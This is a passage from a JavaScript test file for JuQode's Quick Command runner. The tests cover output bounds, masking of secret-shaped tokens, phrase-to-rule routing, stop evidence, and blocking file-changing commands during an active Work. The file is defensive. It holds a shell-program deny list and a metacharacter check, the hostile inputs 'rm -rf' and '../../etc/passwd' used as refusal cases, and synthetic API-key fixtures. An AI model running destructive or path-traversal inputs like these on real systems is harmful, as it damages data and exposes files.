  assert.ok(r.pid > 0);
  assert.ok(Date.parse(r.startedAt) > 0, 'no start time was recorded with the pid');
  r.stop();
  await r.done;
});

test('output is bounded, and the bound is REPORTED', async () => {
  const dir = project({});
  const out = await run.start({ argv: NODE(`const s = 'juqode\\n'.repeat(1000); let n = 0; while (n < ${run.OUTPUT_LIMIT * 3}) { process.stdout.write(s); n += s.length; }`), cwd: dir }).done;
  assert.ok(Buffer.byteLength(out.output, 'utf8') <= run.OUTPUT_LIMIT,
    `${Buffer.byteLength(out.output, 'utf8')} bytes were kept`);
  assert.strictEqual(out.truncated, true,
    'the output was cut and the card would have shown it as complete');
});

test('the live tail is the last few lines, so a long-running card can show progress', async () => {
  const dir = project({});
  const seen = [];
  const r = run.start({ argv: NODE('for (let i = 1; i <= 5; i++) console.log("line-" + i)'), cwd: dir,
                        onUpdate: (u) => { if (u.state === 'running' && u.tail?.length) seen.push(u.tail); } });
  await r.done;
  const last = seen[seen.length - 1];
  assert.ok(last.length <= run.TAIL_LINES, `the tail carried ${last.length} lines`);
  assert.ok(last[last.length - 1].includes('line-5'), 'the tail is not the LAST lines');
});

/* ───────── masking: a reduction, and the product says so ───────── */

test('token-shaped text is masked in what goes on screen', async () => {
  /* `19` §C4: env 값은 절대 출력하지 않고 표시 계층에 토큰 패턴 가림. The fixture values below
   * are synthetic. */
  const cases = [
    'GITHUB_TOKEN=ghp_0123456789abcdefghijklmnopqrstuvwxyz',
    'OPENAI_KEY=sk-0123456789abcdefghij',
    'SLACK=xoxb-0123456789-abcdefghij',
    'AWS_ACCESS_KEY_ID=AKIA0123456789ABCDEF',
    'API_KEY: 0123456789abcdef',
  ];
  for (const c of cases) {
    const masked = run.mask(c);
    assert.ok(masked.includes('***'), `nothing was masked in: ${c.split('=')[0]}`);
    assert.ok(!/0123456789/.test(masked), `the value survived masking: ${c.split('=')[0]}`);
  }
});

test('masking is a REDUCTION and the code says so — it is not measured', () => {
  /* q02 §5.6: 가림의 효과는 측정되지 않았다 — 정규식 초안뿐이고 오탐/미탐을 재지 않았다. The
   * product must not treat this as a containment boundary, and a comment claiming it does is
   * the kind of false claim this run keeps finding. This test pins the ADMISSION. */
  /* `rawOf`, not `srcOf`: the SUBJECT here is the admission, and the admission is a comment.
   * Stripping comments would leave this test unable to see the only thing it is about. */
  const src = rawOf('app/main/qc/run.js');
  assert.ok(/not measured|UNMEASURED/i.test(src),
    'run.js no longer admits that the masking is unmeasured');

  /* …and it demonstrably does not catch everything, which is why the admission matters. */
  assert.strictEqual(run.mask('the password is hunter2'), 'the password is hunter2');
});

test('masking never turns output into something that reads as clean', async () => {
  const dir = project({});
  const out = await run.start({ argv: NODE('console.log("TOKEN=ghp_0123456789abcdefghijklmnopqrstuvwxyz")'), cwd: dir }).done;
  assert.ok(out.output.includes('***'));
  assert.ok(!out.output.includes('ghp_0123456789'), 'the token reached the card');
});

test('no rule ever hands a command to a shell', () => {
  /* The rule table's argv is the last link in the chain that starts at recognition. Routing any
   * of it through `sh -c` would put an interpreter back between the rule and the OS, and every
   * other guarantee — residue-zero matching, a closed rule set, a fixed command — would then be
   * protecting a string that is about to be parsed again anyway. */
  const SHELLS = new Set(['sh', 'bash', 'zsh', 'dash', 'ksh', 'fish',
                          'cmd', 'cmd.exe', 'powershell', 'powershell.exe', 'pwsh', 'pwsh.exe']);
  const root = project({ 'package.json': pkg({ dev: 'vite', build: 'vite build', test: 'node --test' }),
                         '.git/HEAD': 'ref: refs/heads/main\n' });

  let checked = 0;
  for (const rule of RULES) {
    const a = availability(rule.id, { root });
    if (!a.data.argv) continue;
    checked += 1;
    const [program, ...args] = a.data.argv;
    assert.ok(!SHELLS.has(path.basename(program)),
      `${rule.id} runs its command through ${program} — that is a shell`);
    /* …and no ARGUMENT smuggles one in either (`-c "…"`). */
    assert.ok(!args.includes('-c'), `${rule.id} passes -c, which is how a shell is handed a script`);
    for (const arg of args) {
      assert.ok(!/[;&|`$><]/.test(arg), `${rule.id} carries a shell metacharacter in an argument: ${arg}`);
    }
  }
  assert.ok(checked >= 4, `only ${checked} rules produced a command — the check ran on almost nothing`);
});

test('the displayed command and the executed argv describe the same thing', () => {
  /* Two representations of one command drift, and the one the user reads is not the one that
   * runs. `19` §C4 requires the explanation to be true of what will happen. */
  const root = project({ 'package.json': pkg({ dev: 'vite', build: 'vite build', test: 'node --test' }),
                         '.git/HEAD': 'ref: refs/heads/main\n' });
  for (const rule of RULES) {
    const a = availability(rule.id, { root });
    if (!a.data.argv) continue;
    assert.strictEqual(a.data.argv.join(' '), a.data.command,
      `${rule.id}: the card says "${a.data.command}" and the spawn runs "${a.data.argv.join(' ')}"`);
  }
});

/* ───────── the drawer's main-process surface — `15` TD-01 · `19` §C4 ───────── */

const { execFileSync } = require('node:child_process');
const { openDb } = require(path.join(R, 'app/main/db/db.js'));
const repo = require(path.join(R, 'app/main/db/repo.js'));
const { makeHandlers } = require(path.join(R, 'app/main/ipc.js'));
const { unknownTaskRunWithLiveRunner } = require(path.join(R, 'app/main/work/runner-liveness.js'));

/* these tests are about WHAT the hold gates; whether a stored runner is really gone is runner-liveness.test.js */
const OBSERVED_GONE = () => ({ verdict: 'NOT_OBSERVED_WITH_EVIDENCE', reason: 'stub' });
function qcBench(files = { 'package.json': pkg({ test: 'node -e "console.log(1)"', build: 'node -e "process.exit(2)"' }) }, extra = {}) {
  const dir = project(files);
  const db = openDb(':memory:');
  const proj = repo.openProject(db, dir, path.basename(dir));
  const pushed = [];
  /* the evidence store the handlers write the Stop proof into -- a real directory of this bench, read back by stopEvidenceOf */
  const evidence = tempDir('juqode-qc-evidence-');
  const h = makeHandlers({ db: () => db, dbFault: () => null, evidenceStore: () => evidence,
                           push: () => {}, pushQc: (u) => pushed.push(u), ...extra });
  return { dir, db, project: proj, h, pushed, evidence };
}

test('routing explains and runs NOTHING', () => {
  /* `19` §C4: 항상 설명 후 확인. The explanation is its own round trip, so nothing can be
   * started by typing — only by confirming. */
  const b = qcBench();
  const r = b.h['juqode:qc-route'](null, b.project.id, '테스트 돌려줘');
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.route.id, 'qc.test');
  assert.strictEqual(r.available, true);
  assert.strictEqual(r.data.command, 'npm run test');
  /* …and no row exists, because nothing ran (`20` F-12). */
  assert.deepStrictEqual(repo.qcRunsFor(b.db, b.project.id), []);
});

test('미인식 and 모호함 are cards, not rows', () => {
  const b = qcBench();
  const un = b.h['juqode:qc-route'](null, b.project.id, 'rm -rf 해줘');
  assert.strictEqual(un.route.kind, 'unrecognized');
  assert.ok(!un.rule, 'an unrecognised phrase was given a rule');

  const am = b.h['juqode:qc-route'](null, b.project.id, '서버 좀 정리해줘');
  assert.strictEqual(am.route.kind, 'ambiguous');
  assert.deepStrictEqual(am.route.readings, ['qc.dev.stop', 'work']);
  assert.deepStrictEqual(repo.qcRunsFor(b.db, b.project.id), [], 'a card became history');
});

test('an unavailable rule explains WHY and still does not run', () => {
  const b = qcBench({ 'package.json': pkg({}) });          // no scripts at all
  const r = b.h['juqode:qc-route'](null, b.project.id, '빌드 해줘');
  assert.strictEqual(r.route.id, 'qc.build');
  assert.strictEqual(r.available, false);
  assert.strictEqual(r.reason, 'no_script');

  return b.h['juqode:qc-run'](null, b.project.id, 'qc.build', '빌드 해줘').then((run) => {
    assert.strictEqual(run.ok, false);
    assert.strictEqual(run.reason, 'unavailable');
    assert.strictEqual(run.detail, 'no_script');
    assert.deepStrictEqual(repo.qcRunsFor(b.db, b.project.id), [], 'a refused run became history');
  });
});

test('a rule id outside the closed six is refused before anything is looked up', async () => {
  const b = qcBench();
  for (const id of ['qc.rm.rf', 'rm', '', null, 42, '../../etc/passwd']) {
    const r = await b.h['juqode:qc-run'](null, b.project.id, id, 'x');
    assert.strictEqual(r.ok, false, `${JSON.stringify(id)} was accepted`);
    assert.strictEqual(r.reason, 'unknown-rule');
  }
});

test('a run that succeeds becomes a row with its code and its output', async () => {
  const b = qcBench();
  const started = await b.h['juqode:qc-run'](null, b.project.id, 'qc.test', '테스트 돌려줘');
  assert.strictEqual(started.ok, true);
  assert.ok(started.pid > 0);
  assert.strictEqual(started.command, 'npm run test');

  /* Wait for the push that says it ended, rather than for a clock. */
  await new Promise((res) => {
    const t = setInterval(() => { if (b.pushed.some((u) => u.ended)) { clearInterval(t); res(); } }, 20);
  });

  const [row] = repo.qcRunsFor(b.db, b.project.id);
  assert.strictEqual(row.rule_id, 'qc.test');
  assert.strictEqual(row.status, 'success');
  assert.strictEqual(row.exit_code, 0);
  assert.strictEqual(row.phrase, '테스트 돌려줘', 'the user\'s own words are what the row is named by');
  assert.ok(row.output_head.includes('1'), 'the output was not kept');
});

test('a run that fails says so, with the code — never as success', async () => {
  /* `07` §8.1 · `19` §C4: 종료 코드 숨기지 않음. */
  const b = qcBench();
  await b.h['juqode:qc-run'](null, b.project.id, 'qc.build', '빌드 해줘');
  await new Promise((res) => {
    const t = setInterval(() => { if (b.pushed.some((u) => u.ended)) { clearInterval(t); res(); } }, 20);
  });
  const [row] = repo.qcRunsFor(b.db, b.project.id);
  assert.strictEqual(row.status, 'failed');
  assert.strictEqual(row.exit_code, 2);
});

/* A long-running fixture child must NOT end by itself. These tests stop it and assert `stopped`; a child that exits on
 * its own (the old `setTimeout(..., 5000)`) turns every slow Stop into the correct-but-different `ended before the stop
 * took effect`. MEASURED on H1: the Stop's synchronous process snapshot takes ~0.5 s idle and ~2 s under 2x CPU load, and
 * the full suite under that load failed this exact assertion (tests 489 and 494) while qc.test.js alone passed 3/3 -- see
 * qc-stop.test.js for the deterministic mechanism. */
/* what the Stop proved for this row, read back from the evidence store the bench was given -- so a failing assertion
 * says WHY (taskkill status, snapshot, descendants), not just the final status. */
function stopEvidenceOf(row, bench) {
  try { return JSON.parse(fs.readFileSync(path.join(bench.evidence, String(row.output_ref).replace(/^evidence:/, '')), 'utf8')).stop; } catch { return null; }
}

test('a running dev server does not block a different Quick Command', async () => {
  /* `19` §C6 REC-010: long-running Quick Commands run in their OWN child processes **so the
   * drawer stays usable**. A blanket one-at-a-time rule meant a running dev server stopped the
   * user asking for `git status` — and stopped the 개발 서버 끄기 rule from reaching its own
   * handler at all. What is refused is the SAME rule twice. */
  const b = qcBench({ 'package.json': pkg({ dev: 'node -e "setInterval(()=>{},1000)"', test: 'node -e "1"' }) });
  const first = await b.h['juqode:qc-run'](null, b.project.id, 'qc.dev.start', '서버 켜줘');
  assert.strictEqual(first.ok, true);
  assert.strictEqual(first.kind, 'long_running');

  const other = await b.h['juqode:qc-run'](null, b.project.id, 'qc.test', '테스트 돌려줘');
  assert.strictEqual(other.ok, true, 'a dev server blocked an unrelated Quick Command');

  const second = await b.h['juqode:qc-run'](null, b.project.id, 'qc.dev.start', '서버 켜줘');
  assert.strictEqual(second.ok, false, 'the same rule started twice');
  assert.ok(['already-running', 'unavailable'].includes(second.reason));

  /* `20` `qc_status` separates `running` from `long_running`, and `15` TD-01 shows 계속 실행 중
   * for the second — never 완료. The ROW is what a restart reads, so the row has to carry it. */
  /* Two runs are live now, so the row is named rather than taken as "the running one". */
  const devRow = repo.qcRunsFor(b.db, b.project.id).find((x) => x.rule_id === 'qc.dev.start');
  assert.strictEqual(devRow.status, 'long_running',
    'a long-running command was recorded as an ordinary one');

  b.h['juqode:qc-stop'](null, b.project.id);
  await new Promise((res) => {
    const t = setInterval(() => { if (b.pushed.some((u) => u.ended)) { clearInterval(t); res(); } }, 20);
  });
});

test('a running dev server makes 켜기 사용 불가 and 끄기 가능 — from the handle, not a guess', async () => {
  /* `19` §C4: only a server JuQode ITSELF started can be stopped, and `already_running` names
   * the pid so the user can see WHICH process the product means. */
  const b = qcBench({ 'package.json': pkg({ dev: 'node -e "setInterval(()=>{},1000)"' }) });
  const stopBefore = b.h['juqode:qc-stop'](null, b.project.id);
  assert.strictEqual(stopBefore.ok, false);
  assert.strictEqual(stopBefore.reason, 'not-running', 'something offered to stop a server nobody started');

  await b.h['juqode:qc-run'](null, b.project.id, 'qc.dev.start', '서버 켜줘');

  const again = b.h['juqode:qc-route'](null, b.project.id, '개발 서버 켜줘');
  assert.strictEqual(again.available, false);
  assert.strictEqual(again.reason, 'already_running');
  assert.ok(again.data.pid > 0, 'the reason did not name the process it is about');

  const off = b.h['juqode:qc-route'](null, b.project.id, '개발 서버 꺼줘');
  assert.strictEqual(off.available, true, '끄기 is unavailable while a server JuQode started is up');

  b.h['juqode:qc-stop'](null, b.project.id);
  await new Promise((res) => {
    const t = setInterval(() => { if (b.pushed.some((u) => u.ended)) { clearInterval(t); res(); } }, 20);
  });
  const [row] = repo.qcRunsFor(b.db, b.project.id);
  const ev = stopEvidenceOf(row, b);
  /* `stopped` is the proof case. Under CPU load on Windows taskkill itself can answer 255 although the tree is then gone; PM policy
   * (D2): that is `unknown` -- never `stopped`, never `failed` -- and only acceptable here when the evidence says exactly that
   * and the re-checked tree is gone (so nothing is left to hold the Writer gate). */
  const honestUnknown = row.status === 'unknown' && ev?.verdict === 'stop-unconfirmed' && ev.descendants === 'none' && ev.uncertain === false;
  assert.ok(row.status === 'stopped' || honestUnknown, `a stopped server was recorded as ${row.status}: ${JSON.stringify({ exit: row.exit_code, stopped_at: row.stopped_at, stop: ev })}`);
  assert.strictEqual(row.stopped_at === null, row.status !== 'stopped', 'stopped_at is set only for a proven stop');
});

test('the discoverability list names every rule and why each cannot run', () => {
  /* `15` TD-01: 전부 사용 불가 여도 이유와 함께 나열한다. */
  const b = qcBench({ });                                    // no package.json, no .git
  const r = b.h['juqode:qc-list'](null, b.project.id);
  assert.strictEqual(r.rules.length, RULES.length, 'the list is the closed set');
  for (const rule of r.rules) {
    if (rule.available) continue;
    assert.ok(rule.reason, `${rule.id} is unavailable and says nothing about why`);
  }
  /* …and the terminal is always available, so "all unavailable" is not the only shape tested. */
  assert.strictEqual(r.rules.find((x) => x.id === 'qc.terminal.open').available, true);
});

test('a Quick Command whose process vanished becomes 확인 불가, not success', () => {
  /* WBS-34 for QC rows. `20`: exit_code STAYS NULL — nobody observed one. */
  const b = qcBench();
  const id = repo.beginQcRun(b.db, b.project.id, {
    phrase: '서버 켜줘', ruleId: 'qc.dev.start', command: 'npm run dev', status: 'long_running' });
  assert.deepStrictEqual(repo.reconcileQcRuns(b.db, () => true), [], 'a live run was closed');

  assert.deepStrictEqual(repo.reconcileQcRuns(b.db), [id]);
  const row = repo.qcRun(b.db, id);
  assert.strictEqual(row.status, 'unknown');
  assert.strictEqual(row.exit_code, null, 'an exit code was invented for a process nobody saw end');
});

test('a running TEST is not a dev server', async () => {
  /* The handle answers "is a dev server up?", and only a `qc.dev.start` handle may. Treating any
   * live Quick Command as a server would offer to stop a test run under the 개발 서버 끄기 card
   * — and would mark 켜기 as 이미 실행 중 while nothing was serving anything. */
  const b = qcBench({ 'package.json': pkg({ dev: 'node -e "setInterval(()=>{},1000)"',
                                            test: 'node -e "setInterval(()=>{},1000)"' }) });
  const started = await b.h['juqode:qc-run'](null, b.project.id, 'qc.test', '테스트 돌려줘');
  assert.strictEqual(started.ok, true);

  const off = b.h['juqode:qc-route'](null, b.project.id, '개발 서버 꺼줘');
  assert.strictEqual(off.available, false, 'a running test was offered as a server to stop');
  assert.strictEqual(off.reason, 'not_running');

  const on = b.h['juqode:qc-route'](null, b.project.id, '개발 서버 켜줘');
  assert.strictEqual(on.reason, null, 'a running test made 서버 켜기 look already-running');

  b.h['juqode:qc-stop'](null, b.project.id);
  await new Promise((res) => {
    const t = setInterval(() => { if (b.pushed.some((u) => u.ended)) { clearInterval(t); res(); } }, 20);
  });
});

/* ───────── the two rules that spawn NOTHING — `19` §C4's fixed actions ───────── */

test('터미널 열어줘 actually does something when 실행 is pressed', async () => {
  /* MEASURED by the batch-12 product review, and it is the "test that cannot fail" pattern
   * again: the earlier test asserted `available === true` and never pressed 실행. Both of the
   * rules whose action is FIXED rather than a package.json script returned `available: true`
   * with no argv, and the run handler refused them as `not-executable` — so the product
   * explained `터미널 열어줘` as one of its six commands and then said, on the next click,
   * "정해진 Quick Command 가 아니에요". Two of six rules dead-ended. */
  const b = qcBench({});                     // no package.json, no .git — the terminal needs neither
  const routed = b.h['juqode:qc-route'](null, b.project.id, '터미널 열어줘');
  assert.strictEqual(routed.route.id, 'qc.terminal.open');
  assert.strictEqual(routed.available, true);

  const run = await b.h['juqode:qc-run'](null, b.project.id, 'qc.terminal.open', '터미널 열어줘');
  assert.strictEqual(run.ok, true, `실행 was refused: ${run.reason}/${run.detail}`);
  assert.strictEqual(run.action, 'open-drawer');
  /* `20` F-12: nothing was spawned, so there is no row — the same rule a Work that never
   * started obeys. */
  assert.deepStrictEqual(repo.qcRunsFor(b.db, b.project.id), []);
});

test('개발 서버 꺼줘 signals the server JuQode started', async () => {
  const b = qcBench({ 'package.json': pkg({ dev: 'node -e "setInterval(()=>{},1000)"' }) });

  /* With nothing running it is 사용 불가 — and pressing 실행 says the SAME reason, not a
   * different one from a different vocabulary. */
  const refused = await b.h['juqode:qc-run'](null, b.project.id, 'qc.dev.stop', '서버 꺼줘');
  assert.strictEqual(refused.ok, false);
  assert.strictEqual(refused.detail, 'not_running',
    'the run handler answered with a reason the card cannot render');

  const started = await b.h['juqode:qc-run'](null, b.project.id, 'qc.dev.start', '서버 켜줘');
  assert.strictEqual(started.ok, true);

  const stop = await b.h['juqode:qc-run'](null, b.project.id, 'qc.dev.stop', '서버 꺼줘');
  assert.strictEqual(stop.ok, true, `stopping was refused: ${stop.reason}/${stop.detail}`);
  assert.strictEqual(stop.action, 'stop');
  assert.strictEqual(stop.stoppingRunId, started.runId, 'the stop did not name the run it stops');

  await new Promise((res) => {
    const t = setInterval(() => { if (b.pushed.some((u) => u.ended)) { clearInterval(t); res(); } }, 20);
  });
  const [row] = repo.qcRunsFor(b.db, b.project.id);
  const ev = stopEvidenceOf(row, b);
  const honestUnknown = row.status === 'unknown' && ev?.verdict === 'stop-unconfirmed' && ev.descendants === 'none' && ev.uncertain === false;   // PM D2: taskkill 255 under load is unknown, never stopped/failed
  assert.ok(row.status === 'stopped' || honestUnknown, `a stopped server was recorded as ${row.status}: ${JSON.stringify({ exit: row.exit_code, stopped_at: row.stopped_at, stop: ev })}`);
  if (row.status === 'stopped') assert.ok(row.stopped_at, '`20` keeps stopped_at for a run that was signalled');
  else assert.strictEqual(row.stopped_at, null, 'an unconfirmed Stop must not carry stopped_at');
});

test('every refusal the run handler can give has a sentence', () => {
  /* The card looks the reason up in `18`/gap. `availability()` uses underscores and the handler
   * uses hyphens, so a handler reason fell through to `unknown_rule` — "정해진 Quick Command 가
   * 아니에요" about a command the product had just explained. Every reason either side can
   * produce must resolve to something true. */
  const copy = srcOf('app/renderer/copy.js');
  const HANDLER = ['already-running', 'unknown-rule', 'not-executable', 'no-project', 'active-run', 'prior-run-unknown', 'qc-restore-failed'];
  const AVAIL = ['no_script', 'no_package_json', 'already_running', 'not_running',
                 'placeholder_script', 'not_git', 'unknown_rule'];
  for (const r of [...HANDLER, ...AVAIL]) {
    assert.ok(new RegExp(`['"]?${r}['"]?\\s*:`).test(copy),
      `the card has no sentence for the refusal "${r}"`);
  }
});

test('file-changing rules are a closed set and the terminal is not called a sandbox', () => {
  for (const id of ['qc.git.commit', 'qc.build', 'qc.test', 'qc.dev.start', 'qc.deploy']) {
    assert.strictEqual(mutatesProjectFiles(id), true, id);
  }
  for (const id of ['qc.git.status', 'qc.terminal.open', 'qc.dev.stop']) {
    assert.strictEqual(mutatesProjectFiles(id), false, id);
  }
  const copy = srcOf('app/renderer/copy.js');
  assert.ok(!copy.includes('샌드박스'), 'user-facing copy calls the terminal a sandbox');
  assert.ok(!/\bsandbox\b/i.test(copy), 'user-facing copy calls the terminal a sandbox');
  assert.match(copy, /내 컴퓨터에서 내 권한으로 바로 실행/);
});

test('the active-Work check and the spawn are one synchronous turn', () => {
  const ipc = srcOf('app/main/ipc.js');
  const gate = ipc.indexOf('const fileGuard = fileQcBlock(projectId, ruleId)');
  const ret = ipc.indexOf('if (fileGuard)', gate);
  const begin = ipc.indexOf('beginQcRun', ret);
  const spawn = ipc.indexOf('qcRun.start', begin);
  assert.ok(gate !== -1 && ret > gate && begin > ret && spawn > begin, 'the run handler lost the file guard');
  assert.ok(!ipc.slice(gate, spawn).includes('await'),
    'an await between the file-guard read and the spawn lets another handler write first');
  const fn = ipc.indexOf('const fileQcBlock =');
  const fnEnd = ipc.indexOf('const withFileQcBlock', fn);
  assert.ok(fn !== -1 && fnEnd > fn && !ipc.slice(fn, fnEnd).includes('await'),
    'the file guard itself waits, so the read and the spawn are not one turn');
});

test('an active Work refuses a file-changing Quick Command before it writes', async () => {
  const b = qcBench({
    'package.json': pkg({
      build: 'node -e "require(\'fs\').writeFileSync(\'touched.txt\',\'x\')"',
      test: 'node -e "require(\'fs\').writeFileSync(\'touched-test.txt\',\'x\')"',
      dev: 'node -e "require(\'fs\').writeFileSync(\'touched-dev.txt\',\'x\')"',
      deploy: 'node -e "require(\'fs\').writeFileSync(\'touched-deploy.txt\',\'x\')"',
    }),
    'keep.txt': 'same',
    'note.txt': 'keep',
  });
  const before = b.h['juqode:qc-list'](null, b.project.id);
  assert.strictEqual(before.rules.find((r) => r.id === 'qc.build').available, true,
    'the list was already blocked before a Work existed');

  const work = repo.beginWork(b.db, b.project.id, '버튼 고쳐줘');
  assert.strictEqual(work.ok, true, work.reason);

  const during = b.h['juqode:qc-list'](null, b.project.id);
  assert.strictEqual(during.rules.find((r) => r.id === 'qc.build').reason, 'active-run');
  assert.notStrictEqual(during.rules.find((r) => r.id === 'qc.git.status').reason, 'active-run');
  assert.strictEqual(during.rules.find((r) => r.id === 'qc.terminal.open').available, true);
  const routed = b.h['juqode:qc-route'](null, b.project.id, '빌드 해줘');
  assert.strictEqual(routed.available, false);
  assert.strictEqual(routed.reason, 'active-run');

  for (const id of ['qc.build', 'qc.test', 'qc.dev.start', 'qc.deploy', 'qc.git.commit']) {
    const run = await b.h['juqode:qc-run'](null, b.project.id, id, id);
    assert.strictEqual(run.ok, false, id);
    assert.strictEqual(run.reason, 'active-run', `${id} refused as ${run.reason}/${run.detail}`);
  }
  assert.deepStrictEqual(repo.qcRunsFor(b.db, b.project.id), [], 'a refused command became a row');
  for (const name of ['touched.txt', 'touched-test.txt', 'touched-dev.txt', 'touched-deploy.txt', '.git']) {
    assert.ok(!fs.existsSync(path.join(b.dir, name)), `${name} was written during an active Work`);
  }
  assert.strictEqual(fs.readFileSync(path.join(b.dir, 'keep.txt'), 'utf8'), 'same');
  assert.strictEqual(fs.readFileSync(path.join(b.dir, 'note.txt'), 'utf8'), 'keep');

  const opened = await b.h['juqode:qc-run'](null, b.project.id, 'qc.terminal.open', '터미널');
  assert.strictEqual(opened.ok, true);
  assert.strictEqual(opened.action, 'open-drawer');

  const at = new Date().toISOString();
  b.db.prepare(`update work set status = 'ended', outcome = 'complete', ended_at = ? where id = ?`)
    .run(at, work.work.id);
  const after = await b.h['juqode:qc-run'](null, b.project.id, 'qc.build', '빌드 해줘');
  assert.strictEqual(after.ok, true, `${after.reason}/${after.detail}`);
  await new Promise((res) => {
    const t = setInterval(() => {
      if (b.pushed.some((u) => u.runId === after.runId && u.ended)) { clearInterval(t); res(); }
    }, 20);
  });
  assert.ok(fs.existsSync(path.join(b.dir, 'touched.txt')), 'the build did not write once the Work had ended');
});

test('an active Work still allows git status and stopping a JuQode server', async () => {
  const b = qcBench({
    'package.json': pkg({ dev: 'node -e "setInterval(() => {}, 1000)"' }),
    '.git/HEAD': 'ref: refs/heads/main\n',
    'keep.txt': 'same',
  });
  const started = await b.h['juqode:qc-run'](null, b.project.id, 'qc.dev.start', '서버 켜줘');
  assert.strictEqual(started.ok, true, `${started.reason}/${started.detail}`);
  const work = repo.beginWork(b.db, b.project.id, '버튼 고쳐줘');
  assert.strictEqual(work.ok, true, work.reason);

  const status = await b.h['juqode:qc-run'](null, b.project.id, 'qc.git.status', '깃 상태');
  assert.strictEqual(status.ok, true, `${status.reason}/${status.detail}`);
  assert.notStrictEqual(status.reason, 'active-run');

  const stop = await b.h['juqode:qc-run'](null, b.project.id, 'qc.dev.stop', '서버 꺼줘');
  assert.strictEqual(stop.ok, true, `${stop.reason}/${stop.detail}`);
  assert.strictEqual(stop.action, 'stop');
  assert.strictEqual(fs.readFileSync(path.join(b.dir, 'keep.txt'), 'utf8'), 'same');
  await new Promise((res) => {
    const t = setInterval(() => {
      if (b.pushed.some((u) => u.runId === started.runId && u.ended)) { clearInterval(t); res(); }
    }, 20);
  });
});

test('an unacknowledged ended_unknown Work refuses a file-changing Quick Command before it writes', async () => {
  const b = qcBench({
    'package.json': pkg({
      build: 'node -e "require(\'fs\').writeFileSync(\'touched.txt\',\'x\')"',
      test: 'node -e "require(\'fs\').writeFileSync(\'touched-test.txt\',\'x\')"',
      dev: 'node -e "setInterval(() => {}, 1000)"',
      deploy: 'node -e "require(\'fs\').writeFileSync(\'touched-deploy.txt\',\'x\')"',
    }),
    'keep.txt': 'same',
  }, { observeRunner: OBSERVED_GONE });
  execFileSync('git', ['init', '-q'], { cwd: b.dir });
  execFileSync('git', ['config', 'user.email', 'qc-test@example.com'], { cwd: b.dir });
  execFileSync('git', ['config', 'user.name', 'qc-test'], { cwd: b.dir });
  const porcelain = () => execFileSync('git', ['status', '--porcelain'], { cwd: b.dir, encoding: 'utf8' });
  const head = () => {
    try {
      return execFileSync('git', ['rev-parse', '--verify', 'HEAD'], {
        cwd: b.dir, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'],
      });
    } catch { return null; }
  };
  const beforeTree = porcelain();
  const beforeHead = head();

  const started = await b.h['juqode:qc-run'](null, b.project.id, 'qc.dev.start', '서버 켜줘');
  assert.strictEqual(started.ok, true, `${started.reason}/${started.detail}`);

  const legacy = repo.beginWork(b.db, b.project.id, '예전 시도');
  assert.strictEqual(legacy.ok, true, legacy.reason);
  repo.setWorkState(b.db, legacy.work.id, { status: 'ended', outcome: 'ended_unknown' });
  const task = repo.createTask(b.db, b.project.id, { goal: '버튼 고쳐줘', acceptanceCriteria: ['버튼이 눌려요'] });
  const linked = repo.beginWork(b.db, b.project.id, '확인 못 한 시도', { taskId: task.id });
  assert.strictEqual(linked.ok, true, linked.reason);
  repo.setWorkState(b.db, linked.work.id, { status: 'ended', outcome: 'ended_unknown' });
  assert.strictEqual(repo.activeWork(b.db, b.project.id), null);
  assert.ok(unknownTaskRunWithLiveRunner(b.db, b.project.id));
  assert.strictEqual(repo.hasStoppedProcessAcknowledgement(b.db, legacy.work.id), false);
  assert.strictEqual(repo.hasStoppedProcessAcknowledgement(b.db, linked.work.id), false);

  const listed = b.h['juqode:qc-list'](null, b.project.id);
  assert.strictEqual(listed.rules.find((r) => r.id === 'qc.build').reason, 'prior-run-unknown');
  assert.notStrictEqual(listed.rules.find((r) => r.id === 'qc.git.status').reason, 'prior-run-unknown');
  const routed = b.h['juqode:qc-route'](null, b.project.id, '빌드 해줘');
  assert.strictEqual(routed.available, false);
  assert.strictEqual(routed.reason, 'prior-run-unknown');

  const status = await b.h['juqode:qc-run'](null, b.project.id, 'qc.git.status', '깃 상태');
  assert.strictEqual(status.ok, true, `${status.reason}/${status.detail}`);
  const opened = await b.h['juqode:qc-run'](null, b.project.id, 'qc.terminal.open', '터미널');
  assert.strictEqual(opened.ok, true);
  assert.strictEqual(opened.action, 'open-drawer');
  const stop = await b.h['juqode:qc-run'](null, b.project.id, 'qc.dev.stop', '서버 꺼줘');
  assert.strictEqual(stop.ok, true, `${stop.reason}/${stop.detail}`);
  assert.strictEqual(stop.action, 'stop');
  /* a Windows Stop reads the process tree twice (0.5 s idle, ~2-3 s each at 2x CPU load on H1): the bound is the Stop's own
   * documented worst case, and the wait ends the moment the run does */
  await waitFor(STOP_WORST_CASE_MS, () => b.pushed.some((u) => u.runId === started.runId && u.ended));

  const runsBefore = repo.qcRunsFor(b.db, b.project.id).map((r) => r.id);
  for (const id of ['qc.build', 'qc.test', 'qc.dev.start', 'qc.deploy', 'qc.git.commit']) {
    const run = await b.h['juqode:qc-run'](null, b.project.id, id, id);
    assert.strictEqual(run.ok, false, id);
    assert.strictEqual(run.reason, 'prior-run-unknown', `${id} refused as ${run.reason}/${run.detail}`);
  }
  assert.deepStrictEqual(repo.qcRunsFor(b.db, b.project.id).map((r) => r.id), runsBefore,
    'a refused command became a row');
  assert.strictEqual(porcelain(), beforeTree, 'git add changed the index during an unacknowledged stop');
  assert.strictEqual(head(), beforeHead, 'git commit created a commit during an unacknowledged stop');
  for (const name of ['touched.txt', 'touched-test.txt', 'touched-deploy.txt']) {
    assert.ok(!fs.existsSync(path.join(b.dir, name)), `${name} was written`);
  }
  assert.strictEqual(fs.readFileSync(path.join(b.dir, 'keep.txt'), 'utf8'), 'same');

  const denied = b.h['juqode:legacy-unknown-ack'](null, b.project.id, legacy.work.id, false);
  assert.strictEqual(denied.ok, false);
  assert.strictEqual(denied.reason, 'confirmation-required');
  assert.strictEqual(repo.hasStoppedProcessAcknowledgement(b.db, legacy.work.id), false);
  const wrong = b.h['juqode:legacy-unknown-ack'](null, b.project.id, linked.work.id, true);
  assert.strictEqual(wrong.ok, false);
  assert.strictEqual(wrong.reason, 'not-legacy-work');
  assert.strictEqual(repo.hasStoppedProcessAcknowledgement(b.db, linked.work.id), false);
  const still = await b.h['juqode:qc-run'](null, b.project.id, 'qc.build', '빌드 해줘');
  assert.strictEqual(still.reason, 'prior-run-unknown');

  const acked = b.h['juqode:legacy-unknown-ack'](null, b.project.id, legacy.work.id, true);
  assert.strictEqual(acked.ok, true, acked.reason);
  assert.strictEqual(repo.getWork(b.db, legacy.work.id).outcome, 'ended_unknown');
